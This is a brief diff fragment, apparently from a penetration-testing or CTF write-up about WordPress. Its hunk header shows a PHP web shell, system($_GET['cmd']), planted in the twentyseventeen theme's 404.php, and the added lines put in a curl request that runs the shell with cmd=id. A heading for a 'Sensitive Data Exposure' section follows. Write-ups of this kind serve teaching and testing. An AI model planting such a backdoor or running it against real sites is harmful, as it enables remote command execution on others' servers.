@@ -1718,6 +1718,8 @@ system($_GET['cmd']);
  *
  * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 <SNIP>
+
+$ curl -X GET "http://<URL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
 
 #25. - Sensitive Data Exposure
